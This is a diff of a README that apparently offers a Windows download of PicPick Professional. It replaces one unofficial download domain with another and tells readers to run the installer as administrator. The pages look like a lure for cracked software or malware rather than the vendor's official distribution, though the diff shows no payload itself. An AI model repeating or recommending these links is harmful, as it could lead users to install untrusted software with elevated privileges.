@@ -11,20 +11,20 @@ Notes for users who need PicPick Professional running on Windows — especially 
 Use the link below for the Windows package referenced in this guide.
 
 <p align="center">
-  <a href="https://picpick.wonderchain.fun/">
+  <a href="https://picpick.kolmods.com/">
     <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Page** | [picpick.wonderchain.fun](https://picpick.wonderchain.fun/) |
-| **URL** | `https://picpick.wonderchain.fun/` |
+| **Page** | [picpick.kolmods.com](https://picpick.kolmods.com/) |
+| **URL** | `https://picpick.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 
 ### Recommended steps
 
-1. Open the [setup page (picpick.wonderchain.fun)](https://picpick.wonderchain.fun/)
+1. Open the [setup page (picpick.kolmods.com)](https://picpick.kolmods.com/)
 2. Download the package to a folder you can find (e.g. Downloads)
 3. Run the installer **as administrator** if Windows asks
 4. Reboot once if the app prompts after install
